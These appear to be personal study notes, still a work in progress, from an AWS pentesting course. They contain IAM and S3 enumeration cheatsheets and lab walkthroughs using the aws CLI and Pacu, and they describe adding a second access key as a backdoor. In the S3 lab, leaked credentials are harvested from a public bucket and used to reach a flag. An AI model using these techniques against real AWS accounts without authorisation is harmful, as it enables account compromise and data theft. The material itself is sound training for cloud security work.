---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# WIP

> Based on [Intro to AWS Pentesting](https://courses.hacksmarter.org/courses/90bc8479-b808-4a39-9632-7e97ed4eb72f)

## Tools

### aws

{% code overflow="wrap" %}
```bash
# Enable tab autocompletion in aws
echo -e '\nexport PATH=/usr/local/bin/:$PATH\nautoload bashcompinit && bashcompinit\nautoload -Uz compinit && compinit\ncomplete -C "/usr/local/bin/aws_completer" aws' >> ~/.zshrc
```
{% endcode %}

* `accesskey:secret` work like `username:password`
* Created the user `cloudgoat` from IAM and attach the `Admin Access` policy to it
* Then, clicked onto the user and created an access key (`AKIAVUZR3DVG2LOEV4S2`) for CLI usage and it also generated a secret access key

Next, we need to configure the CLI profile:

```bash
$ aws configure --profile cloudgoat
AWS Access Key ID [None]: AKIAVUZR3DVG2LOEV4S2
AWS Secret Access Key [None]: Ew...<REDACTED>...zn
Default region name [None]: us-east-1
Default output format [None]: json

$ export AWS_PAGER=""
# The whoami of aws
$ aws sts get-caller-identity --profile cloudgoat
{
    "UserId": "AIDAVUZR3DVGXPZUMF6XU",
    "Account": "388262206797",
    "Arn": "arn:aws:iam::388262206797:user/cloudgoat"
}
```

### cloudgoat

* [https://github.com/RhinoSecurityLabs/cloudgoat](https://github.com/RhinoSecurityLabs/cloudgoat)
* Cloudgoat has different scenarios for practice

Next, we need to configure cloudgoat:

{% code overflow="wrap" fullWidth="true" %}
```bash
$ uv run cloudgoat config aws
No configuration file was found at /home/x7331/.local/share/uv/tools/cloudgoat/lib/python3.13/site-packages/cloudgoat/config.yml.
Would you like to create this file with a default aws setting now? [y/n]: y
Enter the name of your default AWS profile: cloudgoat
A default aws setting of "cloudgoat" has been saved.

# Whitelist our IP address
$ uv run cloudgoat config whitelist --auto
No whitelist.txt file was found at /home/x7331/.local/share/uv/tools/cloudgoat/lib/python3.13/site-packages/cloudgoat/whitelist.txt

CloudGoat can automatically make a network request, using https://ifconfig.co to find your IP address, and then overwrite the contents of the whitelist file with the result.
Would you like to continue? [y/n]: y

whitelist.txt created with IP address 10.10.10.10/32
```
{% endcode %}

### pacu

* [https://github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
* Pacu is sort of a Metasploit for cloud

## IAM

* **Managed vs Inline policies**: the former can be reused and applied to a lot of users/groups, the latter are granular targeting a specific user/group
* **Roles**: similar to user but have no long-term creds (they expire), they have temporary creds via assumption

### Cheatsheet

{% code overflow="wrap" %}
```bash
# List IAM users
aws iam list-users

# List attached managed policies
aws iam list-attached-user-policies --user-name [user-name]

# List inline policies
aws iam list-user-policies --user-name [user-name]

# List inline policy details
aws iam get-user-policy --user-name [user-name] --policy-name [policy-name]

# List groups memberships
aws iam list-groups-for-user --user-name [user-name]

# List group policies
aws iam list-attached-group-policies --group-name [group-name] aws iam list-group-policies --group-name [group-name]

# List inline group policy details
aws iam get-group-policy --group-name [group-name] --policy-name [policy-name]

# List all roles
aws iam list-roles

# List role details (trust policy)
aws iam get-role --role-name [role-name]

# List attached policies
aws iam list-attached-role-policies --role-name [role-name]

# List inline policies
aws iam list-role-policies --role-name [role-name]

# List inline role policy details
aws iam get-role-policy --role-name [role-name] --policy-name [policy-name]

# Get a managed policy document (by ARN or name)
aws iam get-policy --policy-arn [policy-arn] aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id]

# Dump all IAM permissions (users, roles, groups, policies)
# # Use this to build a full IAM permissions map. Add --filter to target roles/users/groups specifically
aws iam get-account-authorization-details
```
{% endcode %}

* [https://cybr.com/hands-on-labs/lab/introduction-to-aws-iam-enumeration/](https://cybr.com/hands-on-labs/lab/introduction-to-aws-iam-enumeration/)

### User & Policy Recon

{% code overflow="wrap" fullWidth="true" %}
```bash
# Configure aws profile
$ aws configure --profile iam_enum
AWS Access Key ID [None]: AKIAQGYBPW4G6VRYSG7R
AWS Secret Access Key [None]: Yc...<REDACTED>..Jb
Default region name [None]:
Default output format [None]: json
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```bash
# Confirm (whoami)
$ aws sts get-caller-identity --profile iam_enum
{
    "UserId": "AIDAQGYBPW4G6DXQLXUEX",
    "Account": "014498641677",
    "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Joel"
}
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```bash
# More details about the user
$ aws iam get-user --profile iam_enum
{
    "User": {
        "Path": "/",
        "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Joel",
        "UserId": "AIDAQGYBPW4G6DXQLXUEX",
        "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Joel",
        "CreateDate": "2025-09-06T08:20:53+00:00",
        "Tags": [
            {
                "Key": "cybr-lab",
                "Value": "auto-deployed"
            }
        ]
    }
}
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```bash
# Enumerate users
$ aws iam list-users --profile iam_enum
{
    "Users": [
        {
            "Path": "/",
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Chris",
            "UserId": "AIDAQGYBPW4GTJVZCERWP",
            "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Chris",
            "CreateDate": "2025-09-06T08:20:55+00:00"
        },
        {
            "Path": "/",
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Joel",
            "UserId": "AIDAQGYBPW4G6DXQLXUEX",
            "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Joel",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        },
        {
            "Path": "/",
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Mary",
            "UserId": "AIDAQGYBPW4G6VFBRT2EW",
            "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Mary",
            "CreateDate": "2025-09-06T08:20:55+00:00"
        },
        {
            "Path": "/",
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Mike",
            "UserId": "AIDAQGYBPW4GSJAUBO43T",
            "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Mike",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        }
    ]
}
```
{% endcode %}

* Each AWS account can have two different Access Keys. If an account has only one, we can create a backdoor (a second Access Key) to compromise it.

{% code fullWidth="true" %}
```bash
# Check how many Access Key the user has
$ aws iam list-access-keys --profile iam_enum
{
    "AccessKeyMetadata": [
        {
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Joel",
            "AccessKeyId": "AKIAQGYBPW4G6VRYSG7R",
            "Status": "Active",
            "CreateDate": "2025-09-06T08:21:30+00:00"
        }
    ]
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate user policies
$ aws iam list-user-policies --user-name introduction-to-aws-iam-enumeration-1757146849172-Joel --profile iam_enum
{
    "PolicyNames": [
        "AllowEnumerateRoles"
    ]
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Retrieve the policy
$ aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1757146849172-Joel --policy-name AllowEnumerateRoles --profile iam_enum
{
    "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Joel",
    "PolicyName": "AllowEnumerateRoles",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:GetRole",
                    "iam:GetRolePolicy",
                    "iam:ListRoles",
                    "iam:ListRolePolicies"
                ],
                "Resource": "*",
                "Effect": "Allow"
            }
        ]
    }
}
```
{% endcode %}

### Ground & Role Recon

{% code overflow="wrap" %}
```bash
# Enumerate groups
$ aws iam list-groups --profile iam_enum                                                                           {
    "Groups": [
        {
            "Path": "/",
            "GroupName": "introduction-to-aws-iam-enumeration-1757146849172-Developers",
            "GroupId": "AGPAQGYBPW4GT27B76S7K",
            "Arn": "arn:aws:iam::014498641677:group/introduction-to-aws-iam-enumeration-1757146849172-Developers",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        },
        {
            "Path": "/",
            "GroupName": "introduction-to-aws-iam-enumeration-1757146849172-Infrastructure",
            "GroupId": "AGPAQGYBPW4G6AUAOADBF",
            "Arn": "arn:aws:iam::014498641677:group/introduction-to-aws-iam-enumeration-1757146849172-Infrastructure",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        }
    ]
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate user's memberships
$ aws iam list-groups-for-user --user-name introduction-to-aws-iam-enumeration-1757146849172-Joel --profile iam_enum
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "introduction-to-aws-iam-enumeration-1757146849172-Developers",
            "GroupId": "AGPAQGYBPW4GT27B76S7K",
            "Arn": "arn:aws:iam::014498641677:group/introduction-to-aws-iam-enumeration-1757146849172-Developers",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        }
    ]
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate group members
$ aws iam get-group --group-name introduction-to-aws-iam-enumeration-1757146849172-Developers --profile iam_enum   {
    "Users": [
        {
            "Path": "/",
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Joel",
            "UserId": "AIDAQGYBPW4G6DXQLXUEX",
            "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Joel",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        },
        {
            "Path": "/",
            "UserName": "introduction-to-aws-iam-enumeration-1757146849172-Mike",
            "UserId": "AIDAQGYBPW4GSJAUBO43T",
            "Arn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Mike",
            "CreateDate": "2025-09-06T08:20:53+00:00"
        }
    ],
    "Group": {
        "Path": "/",
        "GroupName": "introduction-to-aws-iam-enumeration-1757146849172-Developers",
        "GroupId": "AGPAQGYBPW4GT27B76S7K",
        "Arn": "arn:aws:iam::014498641677:group/introduction-to-aws-iam-enumeration-1757146849172-Developers",
        "CreateDate": "2025-09-06T08:20:53+00:00"
    }
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# List group's policies
$ aws iam list-group-policies --group-name introduction-to-aws-iam-enumeration-1757146849172-Developers --profile iam_enum
{
    "PolicyNames": [
        "introduction-to-aws-iam-enumeration-1757146849172-devs-policy"
    ]
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Retrieve the policy
$ aws iam get-group-policy --group-name introduction-to-aws-iam-enumeration-1757146849172-Developers --policy-name introduction-to-aws-iam-enumeration-1757146849172-devs-policy --profile iam_enum
{
    "GroupName": "introduction-to-aws-iam-enumeration-1757146849172-Developers",
    "PolicyName": "introduction-to-aws-iam-enumeration-1757146849172-devs-policy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:ListAccessKeys"
                ],
                "Resource": [
                    "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Joel",
                    "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Mike"
                ],
                "Effect": "Allow"
            },
            {
                "Action": [
                    "iam:ListGroupPolicies",
                    "iam:ListAttachedPolicies",
                    "iam:ListPolicyVersions",
                    "iam:ListUserPolicies",
                    "iam:ListAttachedUserPolicies",
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListGroupsForUser",
                    "iam:GetPolicy",
                    "iam:GetPolicyVersion",
                    "iam:GetUser",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy",
                    "iam:GetGroup",
                    "iam:ListAttachedGroupPolicies"
                ],
                "Resource": "*",
                "Effect": "Allow"
            }
        ]
    }
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate roles
$ aws iam list-roles --profile iam_enum | grep -i "rolename"
            "RoleName": "AWSReservedSSO_LabAdministrationAccess_f55e2cd3b0eb9777",
            "RoleName": "AWSReservedSSO_LabReadOnlyAccess_4fc938ae93809f1d",
            "RoleName": "AWSServiceRoleForAmazonGuardDuty",
            "RoleName": "AWSServiceRoleForAmazonGuardDutyMalwareProtection",
            "RoleName": "AWSServiceRoleForAmazonInspector2",
            "RoleName": "AWSServiceRoleForAmazonInspector2Agentless",
            "RoleName": "AWSServiceRoleForCloudTrail",
            "RoleName": "AWSServiceRoleForConfigRemediation",
            "RoleName": "AWSServiceRoleForElasticLoadBalancing",
            "RoleName": "AWSServiceRoleForFMS",
            "RoleName": "AWSServiceRoleForOrganizations",
            "RoleName": "AWSServiceRoleForRDS",
            "RoleName": "AWSServiceRoleForSSO",
            "RoleName": "AWSServiceRoleForSupport",
            "RoleName": "AWSServiceRoleForTrustedAdvisor",
            "RoleName": "lab",
            "RoleName": "OrganizationAccountAccessRole",
            "RoleName": "SupportRole",
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate a specific role (The user Mary can assume the SupportRole)
$ aws iam list-roles --query "Roles[?RoleName=='SupportRole']" --profile iam_enum
[
    {
        "Path": "/",
        "RoleName": "SupportRole",
        "RoleId": "AROAQGYBPW4GZHWYSQSQG",
        "Arn": "arn:aws:iam::014498641677:role/SupportRole",
        "CreateDate": "2025-09-06T08:21:11+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::014498641677:root"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "ArnEquals": {
                            "aws:PrincipalArn": "arn:aws:iam::014498641677:user/introduction-to-aws-iam-enumeration-1757146849172-Mary"
                        }
                    }
                }
            ]
        },
        "Description": "Assumable role for internal support",
        "MaxSessionDuration": 3600
    }
]
```
{% endcode %}

```bash
# Enumerate the policy for a specific role
$ aws iam list-role-policies --role-name SupportRole --profile iam_enum
{
    "PolicyNames": [
        "AllowS3FullAccessForRole"
    ]
}
```

{% code overflow="wrap" %}
```bash
# Retrieve the policy (Access to all s3 buckets)
$ aws iam get-role-policy --role-name SupportRole --policy-name AllowS3FullAccessForRole --profile iam_enum
{
    "RoleName": "SupportRole",
    "PolicyName": "AllowS3FullAccessForRole",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:*"
                ],
                "Resource": "*",
                "Effect": "Allow",
                "Sid": "AllowS3FullAccess"
            }
        ]
    }
}
```
{% endcode %}

Doing the above with `pacu`:

```bash
# New session
$ pacu

Version: unknown
Found existing sessions:
  [0] New session
  [1] cloudgoat
Choose an option: 0
```

```bash
# Import aws profile
Pacu (iam_enum:No Keys Set) > import_keys iam_enum
  Imported keys as "imported-iam_enum"
```

```bash
# Confirm
Pacu (iam_enum:imported-iam_enum) > whoami
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
  "AccessKeyId": "AKIAQGYBPW4G6VRYSG7R",
  "SecretAccessKey": "YcvGE/8wqjiHO/nXawA7********************",
  "SessionToken": null,
  "KeyAlias": "imported-iam_enum",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": {},
    "Deny": {}
  }
}
```

{% code overflow="wrap" %}
```bash
# Search for IAM-related modules
Pacu (iam_enum:imported-iam_enum) > search iam

[Category: RECON_UNAUTH] # We are authenticated
<SNIP>
[Category: ENUM]
  iam__enum_permissions # Tries to get a confirmed list of permissions for the current (or all) user(s).
  iam__enum_users_roles_policies_groups # Enumerates users, roles, customer-managed policies, and groups.
<SNIP>

# Find more about the target module
Pacu (iam_enum:imported-iam_enum) > help  iam__enum_users_roles_policies_groups

iam__enum_users_roles_policies_groups written by Spencer Gietzen of Rhino Security Labs.

usage: pacu [--users] [--roles] [--policies] [--groups]

This module requests the info for all users, roles, customer-managed policies, and groups in the account. If no
arguments are supplied, it will enumerate all four, if any are supplied, it will enumerate those only.

options:
  --users     Enumerate info for users in the account
  --roles     Enumerate info for roles in the account
  --policies  Enumerate info for policies in the account
  --groups    Enumerate info for groups in the account
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Enumerate everything
Pacu (iam_enum:imported-iam_enum) > run iam__enum_users_roles_policies_groups
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 4 users
[iam__enum_users_roles_policies_groups] Found 18 roles
[iam__enum_users_roles_policies_groups] No Policies Found
[iam__enum_users_roles_policies_groups]   FAILURE: MISSING NEEDED PERMISSIONS
[iam__enum_users_roles_policies_groups] Found 2 groups
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  4 Users Enumerated
  18 Roles Enumerated
  0 Policies Enumerated
  2 Groups Enumerated
  IAM resources saved in Pacu database.
```
{% endcode %}

```bash
# Lab expired -> configured again the aws profile with the new creds and import it
$ pacu --import-keys iam_enum
Version: unknown
Found existing sessions:
  [0] New session
  [1] cloudgoat
  [2] iam_enum
Choose an option: 2
```

```bash
# List all IAM-related data found
Pacu (cybr:imported-iam_enum) > data iam
```

```bash
# Enumerate the current's user permissions
Pacu (cybr:imported-iam_enum) > run iam__enum_permissions
  Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   introduction-to-aws-iam-enumeration-1757150535478-Joel...
[iam__enum_permissions]     Confirmed Permissions for introduction-to-aws-iam-enumeration-1757150535478-Joel
[iam__enum_permissions] iam__enum_permissions completed.

[iam__enum_permissions] MODULE SUMMARY:

  20 Confirmed permissions for user: introduction-to-aws-iam-enumeration-1757150535478-Joel.
   0 Confirmed permissions for 0 role(s).
   0 Unconfirmed permissions for 0 user(s).
   0 Unconfirmed permissions for 0 role(s).
Type 'whoami' to see detailed list of permissions.

Pacu (cybr:imported-iam_enum) > whoami
{
  "UserName": "introduction-to-aws-iam-enumeration-1757150535478-Joel",
  "RoleName": null,
  "Arn": "arn:aws:iam::014498641659:user/introduction-to-aws-iam-enumeration-1757150535478-Joel",
  "AccountId": "014498641659",
  "UserId": "AIDAQGYBPW35YKROJJYYD",
  "Roles": null,
  "Groups": [
    {
      "Path": "/",
      "GroupName": "introduction-to-aws-iam-enumeration-1757150535478-Developers",
      "GroupId": "AGPAQGYBPW35SKQGWRXHX",
      "Arn": "arn:aws:iam::014498641659:group/introduction-to-aws-iam-enumeration-1757150535478-Developers",
      "CreateDate": "Sat, 06 Sep 2025 09:22:20",
      "Policies": [
        {
          "PolicyName": "introduction-to-aws-iam-enumeration-1757150535478-devs-policy"
        }
      ]
    }
  ],
  "Policies": [
    {
      "PolicyName": "AllowEnumerateRoles"
    }
  ],
  "AccessKeyId": "AKIAQGYBPW353CQMQAWC",
  "SecretAccessKey": "sOlBKp8qwdW2d06IqmW/********************",
  "SessionToken": null,
  "KeyAlias": "imported-iam_enum",
  "PermissionsConfirmed": true,
  "Permissions": {
    "Allow": {
      "iam:listaccesskeys": {
        "Resources": [
          "arn:aws:iam::014498641659:user/introduction-to-aws-iam-enumeration-1757150535478-Joel",
          "arn:aws:iam::014498641659:user/introduction-to-aws-iam-enumeration-1757150535478-Mike"
        ]
      },
      "iam:listgroups": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgroupsforuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:listuserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicyversion": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattacheduserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getgrouppolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listusers": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:getgroup": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattachedpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicyversions": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgrouppolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuserpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattachedgrouppolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listrolepolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listroles": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrolepolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrole": {
        "Resources": [
          "*"
        ]
      }
    },
    "Deny": {}
  }
}
```

## S3

* Cloud's "FTP"
* Buckets -> Top-level containers (globally unique name)
* Objects -> Data/files
* Access Controls: bucket policies (resource-based), IAM policies (identity-based), ACLs (legacy)

### Cheatsheet

```bash
# List all buckets in the authenticated AWS account
aws s3 ls

# Check if a bucket exists (no authentication required)
aws s3 ls s3://[bucket-name] --no-sign-request

# List the contents of a public or accessible bucket (optionally specify a path)
aws s3 ls s3://[bucket-name]/[optional-path] --no-sign-request --recursive

# Download an object from a public or accessible bucket
aws s3 cp s3://[bucket-name]/[key] [local-file] --no-sign-request

# Upload a file to test write access (only works if bucket allows writes)
aws s3 cp test.txt s3://[bucket-name]/test.txt

# Enumerate bucket permissions (authenticated commands)
# Get the bucket policy
aws s3api get-bucket-policy --bucket [bucket-name]

# Get the bucket Access Control List (ACL)
aws s3api get-bucket-acl --bucket [bucket-name]

# Get the Public Access Block settings
aws s3api get-bucket-public-access-block --bucket [bucket-name]

# Get the Cross-Origin Resource Sharing (CORS) configuration (may provide hints for XSS or other client-side issues)
aws s3api get-bucket-cors --bucket [bucket-name]

# List all buckets & objects (useful if compromised AWS credentials are available)
# List all buckets in the account
aws s3api list-buckets

# List objects in a specific bucket (output formatted as a table)
aws s3api list-objects --bucket [bucket-name] --output table

```

### S3 Recon

* [https://pwnedlabs.io/labs/aws-s3-enumeration-basics](https://pwnedlabs.io/labs/aws-s3-enumeration-basics)

{% code overflow="wrap" %}
```bash
$ curl -s http://dev.huge-logistics.com/ | grep s3
  <link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css">
<link rel="shortcut icon" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/favicon.png">
<img src="https://s3.amazonaws.com/dev.huge-logistics.com/static/logo.png" width="100">
<a href="#"><img src="https://s3.amazonaws.com/dev.huge-logistics.com/static/logo.png" id="res_logo"></a>
  <script  src="https://s3.amazonaws.com/dev.huge-logistics.com/static/script.js"></script>
```
{% endcode %}

```bash
# Enumerate the region
$ nslookup dev.huge-logistics.com
Server:         10.255.255.254
Address:        10.255.255.254#53

Non-authoritative answer:
dev.huge-logistics.com  canonical name = dev.huge-logistics.com.s3-website-us-east-1.amazonaws.com.
<SNIP>
```

```bash
# Check if bucket exists and list its contents
$ aws s3 ls s3://dev.huge-logistics.com --no-sign-request --region us-east-1
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 18:00:47       5347 index.html
```

{% code overflow="wrap" %}
```bash
# Enumerate directories
$ aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request --region us-east-1

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
# Same for /migration-files/

$ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request --region us-east-1
2023-10-16 16:08:33          0
2023-10-16 16:09:01        993 hl_migration_project.zip

$ aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request --region us-east-1
2023-10-16 16:08:26          0
2023-10-16 17:52:30      54451 logo.png
2023-10-16 17:52:30        183 script.js
2023-10-16 17:52:31       9259 style.css
```
{% endcode %}

```bash
# Copy (download) the file locally
$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request --region us-east-1
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip

# Unzip the file
$ unzip hl_migration_project.zip
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1

# Inspect the script
$ cat migrate_secrets.ps1
# AWS Configuration
$accessKey = "AKIA3SFMDAPOWOWKXEHU"
$secretKey = "Mw...<REDCATED>...b9"
$region = "us-east-1"
<SNIP>
```

Based on the above, create an `aws` profile and check for further access:

```bash
# Create a new profile
$ aws configure --profile s3_enum
AWS Access Key ID [None]: AKIA3SFMDAPOWOWKXEHU
AWS Secret Access Key [None]: Mw...<REDCATED>...b9
Default region name [None]: us-east-1
Default output format [None]: json

# aws's whoami
$ aws sts get-caller-identity --profile s3_enum
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

```bash
# Check for further access
$ aws s3 ls s3://dev.huge-logistics.com/admin/ --profile s3_enum
2023-10-16 16:08:38          0
2024-12-02 14:57:44         32 flag.txt
2023-10-16 21:24:07       2425 website_transactions_export.csv

# Try to download the files
$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile s3_enum
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden

$ aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile s3_enum
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

```bash
# Enumerate other directories
$ aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile s3_enum
2023-10-16 16:08:47          0
2023-10-16 16:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 16:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 16:09:27       1853 migrate_secrets.ps1
2023-10-16 19:00:13       2494 test-export.xml

# Copy the file locally
$ aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile s3_enum
download: s3://dev.huge-logistics.com/migration-files/test-export.xml to ./test-export.xml

# Inspect the file
$ cat test-export.xml
<SNIP>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey>t2...<REDCATED>...jP</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
<SNIP>
```

```bash
# Configure a new aws profile
$ aws configure --profile it_admin
AWS Access Key ID [None]: AKIA3SFMDAPOQRFWFGCD
AWS Secret Access Key [None]: t2...<REDCATED>...jP
Default region name [None]: us-east-1
Default output format [None]: json

# Try to download the target file
$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile it_admin
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
```
